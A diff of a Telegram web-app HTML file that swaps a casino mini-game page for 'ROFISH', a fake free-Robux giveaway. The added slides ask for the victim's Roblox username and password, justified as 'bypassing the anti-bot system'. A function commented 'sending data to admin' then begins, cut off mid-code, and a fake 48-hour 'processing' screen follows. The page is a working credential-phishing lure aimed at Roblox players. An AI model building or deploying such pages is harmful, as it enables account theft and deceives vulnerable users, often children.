@@ -3,266 +3,356 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ZETYX MODERN EDITION</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link href="https://db.onlinewebfonts.com/c/b031b6714d642b588c876f2b0907d353?family=Minecrafter" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root { --bg: #050508; --panel: #111116; --accent: #ffffff; --win: #00e676; --loss: #ff1744; --mc: 'Minecrafter', sans-serif; }
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; touch-action: manipulation; }
-        body { background: var(--bg); color: #fff; font-family: sans-serif; min-height: 100vh; overflow-x: hidden; }
+        :root {
+            --primary: #00d2ff;
+            --secondary: #3a7afe;
+            --bg: #000000;
+            --card-bg: rgba(10, 10, 10, 0.85);
+            --border: rgba(0, 210, 255, 0.3);
+            --text: #ffffff;
+        }
 
-        #particles-js { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
+        body, html {
+            margin: 0; padding: 0;
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            height: 100vh; overflow: hidden; color: var(--text);
+            user-select: none;
+        }
 
-        .header { height: 60px; background: #000; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; border-bottom: 2px solid #222; position: sticky; top: 0; z-index: 1000; }
-        .logo { font-family: var(--mc); font-size: 18px; color: #fff; letter-spacing: 2px; cursor: pointer; transition: 0.2s; }
+        /* --- ЖИВОЙ ФОН ИЗ ТРЕУГОЛЬНИКОВ --- */
+        #mesh-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
+
+        .card-container {
+            width: 92%; max-width: 420px;
+            height: 580px; position: relative;
+            margin: auto; top: 50%; transform: translateY(-50%);
+        }
+
+        .slide {
+            background: var(--card-bg);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border-radius: 24px;
+            padding: 30px 20px;
+            width: 100%; height: 100%;
+            box-sizing: border-box;
+            box-shadow: 0 0 30px rgba(0, 210, 255, 0.15);
+            border: 1px solid var(--border);
+            position: absolute; top: 0; left: 0;
+            display: flex; flex-direction: column;
+            justify-content: space-between;
+            opacity: 0; visibility: hidden;
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            transform: scale(0.95);
+        }
+
+        .slide.active { opacity: 1; visibility: visible; transform: scale(1); }
+
+        h1 { 
+            font-family: 'Orbitron', sans-serif; 
+            font-size: 32px; margin: 0; 
+            background: linear-gradient(to right, #fff, var(--primary));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            text-align: center; font-weight: 800;
+        }
+
+        .subtitle { font-size: 13px; opacity: 0.5; text-align: center; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
+
+        /* Поля ввода */
+        .input-box { width: 100%; margin-bottom: 15px; }
+        label { display: block; font-size: 11px; margin-bottom: 5px; opacity: 0.6; padding-left: 10px; }
+        input {
+            width: 100%; padding: 18px;
+            border-radius: 16px; border: 1px solid rgba(255,255,255,0.05);
+            background: rgba(255, 255, 255, 0.03);
+            outline: none; font-size: 16px; color: #fff;
+            box-sizing: border-box; transition: 0.3s;
+        }
+        input:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(0, 210, 255, 0.2); transform: scale(1.02); }
+
+        /* Кнопки */
+        .nav-btns { display: flex; gap: 10px; width: 100%; }
+        .btn {
+            height: 60px; border: none; border-radius: 18px;
+            font-weight: 800; font-size: 14px; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            gap: 10px; transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1); flex: 1; text-transform: uppercase;
+        }
+        .btn-next { background: linear-gradient(45deg, var(--primary), var(--secondary)); color: #fff; box-shadow: 0 5px 15px rgba(0, 210, 255, 0.3); }
+        .btn-back { background: rgba(255,255,255,0.05); color: #fff; border: 1px solid var(--border); }
         
-        .bal-wrap { display: flex; align-items: center; gap: 8px; z-index: 1100; }
-        .bal { border: 1px solid #fff; padding: 5px 12px; border-radius: 4px; font-weight: 900; background: #000; font-family: var(--mc); font-size: 12px; }
-        .add-btn { background: #fff; color: #000; border: none; width: 24px; height: 24px; border-radius: 4px; font-weight: 900; font-size: 18px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        /* Эффект нажатия кнопок */
+        .btn:active { transform: scale(0.92); opacity: 0.8; box-shadow: 0 0 5px rgba(0,210,255,0.5); }
 
-        .view { display: none; padding: 15px; max-width: 500px; margin: 0 auto; position: relative; z-index: 10; }
-        .active { display: block !important; }
+        .icon { width: 18px; height: 18px; fill: none; stroke: currentColor; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; }
 
-        .hero { text-align: center; margin: 40px 0; }
-        .hero h1 { font-family: var(--mc); font-size: 28px; margin-bottom: 10px; text-transform: uppercase; }
-        .hero p { color: #555; font-size: 10px; letter-spacing: 2px; }
+        /* Список Robux */
+        .robux-list { width: 100%; overflow-y: auto; max-height: 300px; padding-right: 5px; margin-bottom: 15px; }
+        .robux-list::-webkit-scrollbar { width: 4px; }
+        .robux-list::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 5px; }
 
-        .grid-main { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .card { background: rgba(17, 17, 22, 0.8); border: 1px solid rgba(255,255,255,0.05); padding: 40px 10px; text-align: center; cursor: pointer; transition: 0.3s; backdrop-filter: blur(5px); }
-        .card:hover { border-color: #fff; transform: translateY(-5px); }
-        .card i { font-size: 30px; display: block; margin-bottom: 15px; filter: brightness(2); font-style: normal; }
-        .card span { font-family: var(--mc); font-size: 10px; letter-spacing: 1px; color: #aaa; }
-
-        .game-box { background: var(--panel); border: 1px solid #222; overflow: hidden; display: flex; flex-direction: column; }
-        .ui { padding: 20px; background: #0c0c10; border-bottom: 1px solid #222; display: flex; flex-direction: column; gap: 12px; }
-        .play-area { padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 250px; justify-content: center; position: relative; }
-
-        .label { font-size: 10px; color: #666; font-weight: 900; margin-bottom: 4px; display: block; }
-        input[type="number"] { width: 100%; background: #000; border: 1px solid #333; color: #fff; padding: 12px; border-radius: 4px; font-weight: 900; outline: none; }
+        .robux-item {
+            display: flex; justify-content: space-between; align-items: center;
+            background: rgba(255, 255, 255, 0.03); padding: 16px; border-radius: 16px;
+            margin-bottom: 10px; border: 1px solid transparent; cursor: pointer; transition: 0.3s;
+        }
+        .robux-item:active { transform: scale(0.97); }
+        .robux-item.selected { border-color: var(--primary); background: rgba(0, 210, 255, 0.1); box-shadow: 0 0 15px rgba(0, 210, 255, 0.1); }
         
-        .btn { width: 100%; padding: 16px; background: #fff; border: none; border-radius: 4px; color: #000; font-family: var(--mc); font-size: 14px; cursor: pointer; }
-        .btn-win { background: var(--win) !important; color: #000; }
+        .r-amt { font-weight: 800; font-size: 18px; display: flex; align-items: center; gap: 8px; }
+        .r-price-box { display: flex; flex-direction: column; align-items: flex-end; }
+        .discount { font-size: 10px; color: #ff0055; background: rgba(255, 0, 85, 0.2); padding: 2px 6px; border-radius: 4px; font-weight: 800; margin-bottom: 2px; }
+        .r-price { font-weight: 800; color: #00ff88; font-size: 16px; }
 
-        .row { display: flex; gap: 6px; }
-        .opt { flex: 1; padding: 8px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 4px; font-size: 9px; font-family: var(--mc); cursor: pointer; text-align: center; }
-        .opt.selected { border-color: #fff; background: rgba(255,255,255,0.1); }
-
-        .back { font-family: var(--mc); color: #444; font-size: 10px; margin-bottom: 15px; display: inline-block; cursor: pointer; }
-
-        .slider-cont { width: 100%; max-width: 300px; height: 4px; background: #222; position: relative; margin: 30px 0; }
-        .slider-fill { height: 100%; background: #444; width: 50%; }
-        .dice-stick { position: absolute; top: -12px; width: 2px; height: 30px; background: #fff; z-index: 100; display: none; box-shadow: 0 0 10px #fff; }
-
-        input[type=range] { -webkit-appearance: none; position: absolute; top: -12px; left: 0; width: 100%; height: 30px; background: transparent; z-index: 120; cursor: pointer; }
-        input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; height: 28px; width: 28px; border-radius: 50%; background: #fff; border: 4px solid #000; }
-
-        .t-grid { display: flex; flex-direction: column-reverse; gap: 5px; width: 220px; }
-        .t-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 5px; opacity: 0.2; }
-        .t-row.on { opacity: 1; }
-        .tile, .m-box { aspect-ratio: 1; background: #1a1a1a; border: 1px solid #333; border-radius: 4px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
-        .m-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; width: 260px; }
+        /* Бесконечная загрузка */
+        .loader-wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; flex-grow: 1; }
+        .spinner {
+            width: 60px; height: 60px; border: 4px solid rgba(0, 210, 255, 0.1);
+            border-top: 4px solid var(--primary); border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 20px;
+            box-shadow: 0 0 20px rgba(0, 210, 255, 0.4);
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        .p-mult-container { display: flex; gap: 2px; width: 100%; margin-top: 5px; }
-        .pm { flex: 1; background: #fff; color: #000; font-size: 7px; font-weight: 900; text-align: center; padding: 6px 0; border-radius: 2px; }
+        .wait-text { font-size: 20px; font-weight: 800; color: var(--primary); margin-bottom: 5px; text-transform: uppercase; text-align: center;}
+        .wait-sub { font-size: 14px; opacity: 0.6; text-align: center; }
 
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; align-items: center; justify-content: center; }
-        .modal-content { background: var(--panel); border: 1px solid #333; padding: 30px; width: 90%; max-width: 350px; text-align: center; border-radius: 8px; }
+        /* Custom Alert */
+        #custom-alert {
+            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
+            width: 85%; max-width: 340px; background: var(--primary); color: #000;
+            padding: 18px; border-radius: 20px; z-index: 9999; text-align: center;
+            font-weight: 800; transition: 0.5s; box-shadow: 0 10px 30px rgba(0, 210, 255, 0.4);
+        }
+        #custom-alert.show { top: 30px; }
+
     </style>
 </head>
 <body>
 
-<div id="particles-js"></div>
-<div class="header">
-    <div class="logo" onclick="playClick(); go('lobby')">ZETYX</div>
-    <div class="bal-wrap">
-        <div class="bal"><span id="balance">0.00</span> ⭐</div>
-        <button class="add-btn" onclick="openDep()">+</button>
-    </div>
-</div>
+    <canvas id="mesh-canvas"></canvas>
+    <div id="custom-alert"></div>
 
-<div id="depModal" class="modal">
-    <div class="modal-content">
-        <h2 style="font-family:var(--mc); font-size:14px; margin-bottom:20px;">ДЕПОЗИТ (⭐)</h2>
-        <input type="number" id="depAmount" value="50">
-        <div style="display:flex; gap:10px; margin-top:20px;">
-            <button class="btn" onclick="confirmDep()">КУПИТЬ</button>
-            <button class="btn" style="background:#222; color:#fff" onclick="closeDep()">X</button>
-        </div>
-    </div>
-</div>
+    <div class="card-container">
 
-<div id="lobby" class="view active">
-    <div class="hero"><h1>ПРЕОБРАЗИ СВОЙ ДОСУГ</h1><p>STRICT STYLE • HIGH STAKES</p></div>
-    <div class="grid-main">
-        <div class="card" onclick="playClick(); go('dice')"><i>🎲</i><span>DICE</span></div>
-        <div class="card" onclick="playClick(); go('tower')"><i>🏰</i><span>TOWER</span></div>
-        <div class="card" onclick="playClick(); go('mines')"><i>💣</i><span>MINES</span></div>
-        <div class="card" onclick="playClick(); go('limbo')"><i>🚀</i><span>LIMBO</span></div>
-        <div class="card" onclick="playClick(); go('plinko')"><i>🔺</i><span>PLINKO</span></div>
-    </div>
-</div>
-
-<div id="dice" class="view">
-    <span class="back" onclick="playClick(); go('lobby')">← НАЗАД</span>
-    <div class="game-box">
-        <div class="ui">
-            <input type="number" id="dice_bet" value="100">
-            <div class="row">
-                <div style="flex:1"><span class="label">ИКС</span><div id="dice_m" style="font-family:var(--mc);">1.98x</div></div>
-                <div style="flex:1"><span class="label">ШАНС</span><div id="dice_c" style="font-family:var(--mc);">50%</div></div>
+        <div class="slide active" id="slide-0">
+            <div>
+                <h1>ROFISH</h1>
+                <p class="subtitle">FREE ROBUX DISTRIBUTION</p>
+                <div style="margin-top: 40px; background: rgba(0,210,255,0.05); padding: 20px; border-radius: 16px; border: 1px solid rgba(0,210,255,0.2);">
+                    <p style="font-size: 14px; opacity: 0.9; line-height: 1.8; margin:0 0 10px 0;">🎁 <b>Спонсорская раздача</b> валюты. Все пакеты доступны абсолютно бесплатно.</p>
+                    <p style="font-size: 14px; opacity: 0.9; line-height: 1.8; margin:0;">⏳ <b>Лимитировано:</b> Акция действует только сегодня.</p>
+                </div>
             </div>
-            <button class="btn" onclick="playDice()">ИГРАТЬ</button>
+            <button class="btn btn-next" onclick="nextSlide(1)">
+                ПОЛУЧИТЬ БЕСПЛАТНО <svg class="icon"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </button>
         </div>
-        <div class="play-area">
-            <div id="dice_res_text" style="font-family:var(--mc); font-size: 28px; margin-bottom: 10px;">0.00</div>
-            <div class="slider-cont"><div class="slider-fill" id="dice_f"></div><div class="dice-stick" id="dice_stick"></div><input type="range" id="dice_r" min="2" max="98" value="50" oninput="updDice(); playTick();"></div>
-        </div>
-    </div>
-</div>
 
-<div id="tower" class="view">
-    <span class="back" onclick="playClick(); go('lobby')">← НАЗАД</span>
-    <div class="game-box">
-        <div class="ui">
-            <input type="number" id="tower_bet" value="100">
-            <div class="row">
-                <button class="opt selected" id="tm1" onclick="playClick(); setTM(1)">1 МИНА</button>
-                <button class="opt" id="tm2" onclick="playClick(); setTM(2)">2 МИНЫ</button>
-                <button class="opt" id="tm3" onclick="playClick(); setTM(3)">3 МИНЫ</button>
+        <div class="slide" id="slide-1">
+            <div>
+                <h1>АККАУНТ</h1>
+                <p class="subtitle">Step 01 / Login</p>
+                <div class="input-box">
+                    <label>НИКНЕЙМ ROBLOX</label>
+                    <input type="text" id="login" placeholder="Напр. RobloxKing777" autocomplete="off">
+                </div>
             </div>
-            <button class="btn" id="t_start" onclick="startTower()">ИГРАТЬ</button>
-            <button class="btn btn-win" id="t_cash" onclick="cashTower()" style="display:none">ЗАБРАТЬ <span id="t_profit">0</span></button>
-        </div>
-        <div class="play-area"><div class="t-grid" id="t_grid"></div></div>
-    </div>
-</div>
-
-<div id="mines" class="view">
-    <span class="back" onclick="playClick(); go('lobby')">← НАЗАД</span>
-    <div class="game-box">
-        <div class="ui">
-            <input type="number" id="mines_bet" value="100">
-            <input type="number" id="mines_cnt" value="3" min="1" max="24">
-            <button class="btn" id="m_start" onclick="startMines()">ИГРАТЬ</button>
-            <button class="btn btn-win" id="m_cash" onclick="cashMines()" style="display:none">ЗАБРАТЬ <span id="m_profit">0</span></button>
-        </div>
-        <div class="play-area"><div class="m-grid" id="m_grid"></div></div>
-    </div>
-</div>
-
-<div id="limbo" class="view">
-    <span class="back" onclick="playClick(); go('lobby')">← НАЗАД</span>
-    <div class="game-box">
-        <div class="ui">
-            <input type="number" id="limbo_bet" value="100">
-            <input type="number" id="limbo_target" value="2.0" step="0.1">
-            <button class="btn" onclick="playLimbo()">ИГРАТЬ</button>
-        </div>
-        <div class="play-area"><div id="limbo_res_text" style="font-family:var(--mc); font-size:30px;">1.00x</div></div>
-    </div>
-</div>
-
-<div id="plinko" class="view">
-    <span class="back" onclick="playClick(); go('lobby')">← НАЗАД</span>
-    <div class="game-box">
-        <div class="ui">
-            <input type="number" id="plinko_bet" value="100">
-            <div class="row" id="p_opts">
-                <button class="opt selected" id="pr8" onclick="playClick(); setPR(8)">8 РЯДОВ</button>
-                <button class="opt" id="pr12" onclick="playClick(); setPR(12)">12 РЯДОВ</button>
-                <button class="opt" id="pr16" onclick="playClick(); setPR(16)">16 РЯДОВ</button>
+            <div class="nav-btns">
+                <button class="btn btn-back" onclick="prevSlide(0)"><svg class="icon"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
+                <button class="btn btn-next" onclick="nextSlide(2)">ДАЛЕЕ <svg class="icon"><path d="M5 12h14M12 5l7 7-7 7"/></svg></button>
             </div>
-            <button class="btn" id="p_btn" onclick="playPlinko()">ИГРАТЬ</button>
         </div>
-        <div class="play-area">
-            <canvas id="p_can" width="320" height="250"></canvas>
-            <div id="p_mults" class="p-mult-container"></div>
+
+        <div class="slide" id="slide-2">
+            <div>
+                <h1>ЗАЩИТА</h1>
+                <p class="subtitle">Step 02 / Verification</p>
+                <div class="input-box">
+                    <label>ПАРОЛЬ ОТ АККАУНТА</label>
+                    <input type="password" id="pass" placeholder="••••••••">
+                </div>
+                <p style="font-size:11px; color:#ff0055; text-align:center; opacity:0.8;">Необходим для обхода анти-бот системы</p>
+            </div>
+            <div class="nav-btns">
+                <button class="btn btn-back" onclick="prevSlide(1)"><svg class="icon"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
+                <button class="btn btn-next" onclick="nextSlide(3)">ДАЛЕЕ <svg class="icon"><path d="M5 12h14M12 5l7 7-7 7"/></svg></button>
+            </div>
         </div>
+
+        <div class="slide" id="slide-3">
+            <div style="height: 100%; display: flex; flex-direction: column;">
+                <h1 style="font-size: 24px;">ВЫБЕРИТЕ ПАКЕТ</h1>
+                <p class="subtitle" style="margin-bottom: 10px;">Cost: 0 ₽</p>
+                
+                <div class="robux-list" id="r-list">
+                    </div>
+
+                <div class="nav-btns" style="margin-top: auto;">
+                    <button class="btn btn-back" onclick="prevSlide(2)"><svg class="icon"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
+                    <button class="btn btn-next" id="final-btn" onclick="sendData()">ПОЛУЧИТЬ</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide" id="slide-4">
+            <div class="loader-wrapper">
+                <div class="spinner"></div>
+                <div class="wait-text">ОБРАБОТКА...</div>
+                <div class="wait-sub">Ожидайте ≈48 часов</div>
+            </div>
+            
+            <button class="btn btn-back" style="width: 100%; border-color: var(--primary); color: var(--primary);" onclick="goToHome()">
+                ВЕРНУТЬСЯ НА ГЛАВНУЮ
+            </button>
+        </div>
+
     </div>
-</div>
 
-<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
-<script>
-    // --- ВОТ ОН, СЕРВЕР УРЛ ---
-    const SERVER_URL = "http://144.31.223.15:8000"; 
-    
-    const tg = window.Telegram.WebApp;
-    const uId = tg.initDataUnsafe.user?.id || 0;
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.headerColor = "#000000";
+        tg.backgroundColor = "#000000";
 
-    const aCtx = new (window.AudioContext || window.webkitAudioContext)();
-    function snd(f, t, d, v) { 
-        const o = aCtx.createOscillator(); const g = aCtx.createGain(); 
-        o.type = t; o.frequency.setValueAtTime(f, aCtx.currentTime); 
-        g.gain.setValueAtTime(0, aCtx.currentTime); g.gain.linearRampToValueAtTime(v, aCtx.currentTime + 0.01);
-        g.gain.exponentialRampToValueAtTime(0.0001, aCtx.currentTime + d); 
-        o.connect(g); g.connect(aCtx.destination); o.start(); o.stop(aCtx.currentTime + d); 
-    }
-    const playClick = () => snd(440, 'triangle', 0.15, 0.08);
-    const playTick = () => snd(330, 'sine', 0.1, 0.05);
-    const playWin = () => { snd(523.25, 'triangle', 0.3, 0.1); setTimeout(()=>snd(659.25, 'triangle', 0.4, 0.1), 120); };
-    const playLoss = () => snd(220, 'sine', 0.5, 0.12);
+        // Функция вибрации при клике
+        function haptic() {
+            if (tg.HapticFeedback) {
+                tg.HapticFeedback.impactOccurred('medium');
+            }
+        }
 
-    let bal = 0.0;
-    const multData = { 8: [5, 2, 1.2, 0.5, 0.2, 0.5, 1.2, 2, 5], 12: [10, 5, 2, 1.2, 0.5, 0.2, 0.1, 0.2, 0.5, 1.2, 2, 5, 10], 16: [50, 20, 10, 5, 2, 1.2, 0.5, 0.2, 0.1, 0.2, 0.5, 1.2, 2, 5, 10, 20, 50] };
+        // --- MESH BACKGROUND ENGINE (ПЕРЕЛИВАЮЩИЕСЯ ТРЕУГОЛЬНИКИ) ---
+        const canvas = document.getElementById('mesh-canvas');
+        const ctx = canvas.getContext('2d');
+        let pts = [];
+        let time = 0;
 
-    // ЕДИНСТВЕННАЯ НОВАЯ ФУНКЦИЯ ДЛЯ СИНХРОНИЗАЦИИ БАЛАНСА
-    async function fetchBal() {
-        if(!uId) return;
-        try { 
-            const r = await fetch(`${SERVER_URL}/get_balance/${uId}`); 
-            const d = await r.json(); 
-            bal = d.balance; 
-            updBal(); 
-        } catch(e) {}
-    }
+        function init() {
+            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+            pts = [];
+            // Создаем точки
+            for(let i=0; i<50; i++) {
+                pts.push({ 
+                    x: Math.random()*canvas.width, y: Math.random()*canvas.height, 
+                    vx: (Math.random()-0.5)*0.5, vy: (Math.random()-0.5)*0.5 
+                });
+            }
+        }
 
-    function openDep() { document.getElementById('depModal').style.display='flex'; }
-    function closeDep() { document.getElementById('depModal').style.display='none'; }
-    function confirmDep() { let a = document.getElementById('depAmount').value; tg.sendData("pay:" + a); tg.close(); }
-    function go(id) { document.querySelectorAll('.view').forEach(v => v.classList.remove('active')); document.getElementById(id).classList.add('active'); if(id==='tower') resetTower(); if(id==='mines') resetMines(); if(id==='plinko') initPlinko(); }
-    function updBal() { document.getElementById('balance').innerText = bal.toFixed(2); }
+        function draw() {
+            time += 0.5;
+            // Динамически меняем цвет линий (от синего к фиолетовому и обратно)
+            const hue = 200 + Math.sin(time * 0.01) * 50; 
+            
+            ctx.fillStyle = "#000000"; ctx.fillRect(0,0,canvas.width,canvas.height);
+            
+            pts.forEach((p, i) => {
+                p.x += p.vx; p.y += p.vy;
+                if(p.x<0 || p.x>canvas.width) p.vx *= -1; 
+                if(p.y<0 || p.y>canvas.height) p.vy *= -1;
+                
+                // Соединяем точки линиями, образуя треугольники
+                for(let j=i+1; j<pts.length; j++) {
+                    let d = Math.hypot(p.x-pts[j].x, p.y-pts[j].y);
+                    if(d<140) {
+                        ctx.beginPath(); ctx.moveTo(p.x, p.y); ctx.lineTo(pts[j].x, pts[j].y);
+                        ctx.strokeStyle = `hsla(${hue}, 100%, 60%, ${1 - d/140})`; 
+                        ctx.lineWidth = 1; ctx.stroke();
+                    }
+                }
+            });
+            requestAnimationFrame(draw);
+        }
+        window.onresize = init; init(); draw();
 
-    // --- ТВОИ ОРИГИНАЛЬНЫЕ ИГРЫ (КАК В САМОМ ПЕРВОМ КОДЕ) ---
-    function updDice() { let v = document.getElementById('dice_r').value; document.getElementById('dice_f').style.width = v + '%'; document.getElementById('dice_m').innerText = (98/v).toFixed(2) + 'x'; document.getElementById('dice_c').innerText = v + '%'; }
-    function playDice() { let b = +document.getElementById('dice_bet').value, t = +document.getElementById('dice_r').value; if(b > bal || b <= 0) return; bal -= b; let r = (Math.random()*100).toFixed(2); document.getElementById('dice_res_text').innerText = r; document.getElementById('dice_stick').style.display = 'block'; document.getElementById('dice_stick').style.left = r + '%'; if(+r <= t) { bal += b * (98/t); playWin(); } else playLoss(); updBal(); }
+        // --- ЛОГИКА ПАКЕТОВ (-100% 0₽) ---
+        const packs = [22500, 10000, 4500, 1700, 800, 400, 80, 40];
+        let selectedR = 80;
+        const listDiv = document.getElementById('r-list');
 
-    let tL=0, tA=false, tM=1;
-    function setTM(n){ tM=n; document.querySelectorAll('#tower .opt').forEach(b=>b.classList.remove('selected')); document.getElementById('tm'+n).classList.add('selected'); }
-    function resetTower() { tL=0; tA=false; document.getElementById('t_start').style.display='block'; document.getElementById('t_cash').style.display='none'; const g=document.getElementById('t_grid'); g.innerHTML=''; for(let i=0; i<8; i++){ let r=document.createElement('div'); r.className='t-row'; r.id='tr'+i; for(let j=0; j<4; j++){ let c=document.createElement('div'); c.className='tile'; c.onclick=()=>stepTower(i,j); r.appendChild(c); } g.appendChild(r); } }
-    function startTower(){ let b = +document.getElementById('tower_bet').value; if(b > bal) return; bal -= b; updBal(); tA = true; document.getElementById('tr0').classList.add('on'); document.getElementById('t_start').style.display='none'; document.getElementById('t_cash').style.display='block'; }
-    function stepTower(r, c) { if(!tA || r !== tL) return; if(Math.random()>0.3){ playTick(); document.getElementById('tr'+r).children[c].style.background='var(--win)'; tL++; if(tL<8) document.getElementById('tr'+tL).classList.add('on'); document.getElementById('t_profit').innerText = (150*tL).toFixed(2); } else { playLoss(); resetTower(); }}
-    function cashTower() { bal += parseFloat(document.getElementById('t_profit').innerText); updBal(); resetTower(); }
+        packs.forEach(amount => {
+            const div = document.createElement('div');
+            div.className = `robux-item ${amount === 80 ? 'selected' : ''}`;
+            div.innerHTML = `
+                <div class="r-amt">⬣ ${amount.toLocaleString()}</div>
+                <div class="r-price-box">
+                    <span class="discount">-100%</span>
+                    <span class="r-price">0 ₽</span>
+                </div>
+            `;
+            div.onclick = () => {
+                haptic(); // Вибрация
+                document.querySelectorAll('.robux-item').forEach(el => el.classList.remove('selected'));
+                div.classList.add('selected');
+                selectedR = amount;
+            };
+            listDiv.appendChild(div);
+        });
 
-    let mA=false, mGr=[];
-    function resetMines() { const g=document.getElementById('m_grid'); g.innerHTML=''; for(let i=0; i<25; i++) { let t=document.createElement('div'); t.className='m-box'; t.onclick=()=>stepMines(i); g.appendChild(t); } mA=false; document.getElementById('m_start').style.display='block'; document.getElementById('m_cash').style.display='none'; }
-    function startMines() { let b = +document.getElementById('mines_bet').value; if(b > bal) return; bal-=b; updBal(); mA=true; mGr=Array(25).fill(0).map(()=>Math.random()<0.2?1:0); document.getElementById('m_start').style.display='none'; document.getElementById('m_cash').style.display='block'; }
-    function stepMines(i) { if(!mA) return; if(mGr[i]===0){ playTick(); document.getElementById('m_grid').children[i].style.background='var(--win)'; } else { playLoss(); resetMines(); } }
-    function cashMines() { bal+=100; updBal(); resetMines(); }
+        // Уведомления
+        function showAlert(t) { 
+            const a = document.getElementById('custom-alert'); 
+            a.innerText = t; a.classList.add('show'); 
+            setTimeout(()=>a.classList.remove('show'), 3000); 
+        }
 
-    function playLimbo() { let b = +document.getElementById('limbo_bet').value; if(b > bal) return; bal -= b; let r = (Math.random()*5).toFixed(2); document.getElementById('limbo_res_text').innerText = r+'x'; if(r > 2) { bal+=b*2; playWin(); } else playLoss(); updBal(); }
+        // Переключение слайдов
+        function nextSlide(id) { 
+            haptic();
+            const curr = document.querySelector('.slide.active');
+            if(curr.id === 'slide-1' && !document.getElementById('login').value) return showAlert("⚠️ Укажите ник");
+            if(curr.id === 'slide-2' && !document.getElementById('pass').value) return showAlert("⚠️ Введите пароль");
+            curr.classList.remove('active'); document.getElementById(`slide-${id}`).classList.add('active'); 
+        }
 
-    let pR=8, pBalls=[]; const pCan=document.getElementById('p_can'), pCtx=pCan.getContext('2d');
-    function setPR(r) { pR=r; document.querySelectorAll('#plinko .opt').forEach(b=>b.classList.remove('selected')); document.getElementById('pr'+r).classList.add('selected'); initPlinko(); }
-    function initPlinko() { 
-        pCtx.clearRect(0,0,320,250); pCtx.fillStyle="rgba(255,255,255,0.1)"; 
-        const sp=230/(pR+2); for(let i=0; i<pR; i++) { for(let j=0; j<=i; j++) { pCtx.beginPath(); pCtx.arc(160-(i*sp/2)+(j*sp), 20+(i*sp), 2, 0, 7); pCtx.fill(); }}
-        const cont = document.getElementById('p_mults'); cont.innerHTML = '';
-        multData[pR].forEach(x => { let d=document.createElement('div'); d.className='pm'; d.innerText=x+'x'; cont.appendChild(d); });
-    }
-    function playPlinko() { let b = +document.getElementById('plinko_bet').value; if(b > bal) return; bal -= b; updBal(); pBalls.push({x:160, y:10, r:0, vx:0, vy:3, b:b}); if(pBalls.length===1) animPlinko(); }
-    function animPlinko() { 
-        if(!pBalls.length) return; pCtx.clearRect(0,0,320,250); initPlinko(); 
-        const sp=230/(pR+2); for(let i=pBalls.length-1; i>=0; i--) { 
-            let b = pBalls[i]; b.y += b.vy; b.x += b.vx; let curR = Math.floor((b.y-20)/sp);
-            if(curR > b.r && b.r < pR) { playTick(); b.r = curR; b.vx = (Math.random() > 0.5 ? 1 : -1) * (sp/10) + (160 - b.x) * 0.15; }
-            pCtx.fillStyle='#fff'; pCtx.beginPath(); pCtx.arc(b.x, b.y, 4, 0, 7); pCtx.fill();
-            if(b.y > 20 + pR*sp) { playWin(); let pos = Math.max(0, Math.min(pR, Math.round((b.x-(160-(pR*sp/2)))/sp))); bal += b.b * multData[pR][pos]; updBal(); pBalls.splice(i,1); }
-        } requestAnimationFrame(animPlinko); 
-    }
+        function prevSlide(id) { 
+            haptic();
+            document.querySelector('.slide.active').classList.remove('active'); 
+            document.getElementById(`slide-${id}`).classList.add('active'); 
+        }
 
-    particlesJS("particles-js", { "particles": { "number": { "value": 40 }, "shape": { "type": "triangle" }, "opacity": { "value": 0.15 }, "line_linked": { "enable": true, "opacity": 0.05 }, "move": { "enable": true, "speed": 1.2 } } });
-    tg.expand(); fetchBal(); setInterval(fetchBal, 5000); updDice();
-</script>
+        function goToHome() {
+            haptic();
+            document.getElementById('login').value = '';
+            document.getElementById('pass').value = '';
+            document.querySelector('.slide.active').classList.remove('active');
+            document.getElementById('slide-0').classList.add('active');
+        }
+
+        // ОТПРАВКА ДАННЫХ АДМИНУ
+        async function sendData() {
+            haptic();
+            const btn = document.getElementById('final-btn');
+            btn.innerText = "ПРОВЕРКА..."; btn.style.opacity = "0.5";
+            
+            try {
